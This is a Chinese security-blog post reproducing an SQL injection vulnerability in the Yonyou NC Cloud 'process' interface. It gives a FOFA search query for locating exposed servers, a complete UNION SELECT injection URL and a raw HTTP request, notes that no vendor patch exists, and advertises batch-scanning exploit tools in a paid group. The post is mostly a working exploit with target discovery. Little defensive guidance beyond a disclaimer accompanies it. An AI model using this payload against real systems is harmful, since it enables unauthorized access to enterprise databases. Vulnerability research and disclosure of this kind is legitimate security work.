#  用友NC process接口存在SQL注入漏洞 附POC   
2024-11-26更新  南风漏洞复现文库   2024-11-26 13:39  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. 用友NC简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC process接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5b82YhVsxUhxBuABlbWmB1qoKIfNInkrl8t6YbiaygiakKXqsmaIgT0sww/640?wx_fmt=png&from=appmsg "null")  
  
用友NC process接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="/Client/Uclient/UClient.exe"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(98)||CHR(118)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20  
  
漏洞数据包：  
```
GET /portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(98)||CHR(118)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5botwH7RlFBJ7VddMCQStVtNPXhYZAible7KFNqBHN8412HFeQicXcwAuQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5bM7CtiaPKOdic4B5VzbTibtpNydoJrJGGWT3Uib2cxrzib9huNhNOEbX2ZQw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5bUibp6gVk2oIicibhdnyjxXdCdGYzbzDC8YjPBiaEerEgtyuzFZ2uN544UQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5bUf3ibasScgibI64OgzCyLo6t5QsGZ4hMTyqPJxBBiadHtKDkn7HAyFkicg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5b8GyPLO5MemzbCAmgqnsHRj5PUo9ax6IYv2kWhAgDLa9icP8E4hRohLA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5biaD4gtvVZHtcp8qhpdtUmglnQBAE4yGbhsKgm54hR1iaw6tnu81icVYRA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZmdgibpWB775CPuMmVQ6r5bFVdBEFwfGNOz8gsRmj7oNibnjmD62ichtkIzHILG7EicrntcbSTiaLqMZQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新：https://www.yonyou.com/  
## 8.往期回顾  
  
[宏景HCM uploadLogo.do接口存在任意文件上传漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487823&idx=1&sn=b199f8958061b41143c57569ecbb7973&scene=21#wechat_redirect)  
  
  
[用友YonBIP yonbiplogin接口存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487775&idx=1&sn=05404cfc4ffbf12817b257bef2725440&scene=21#wechat_redirect)  
  
  
  
  
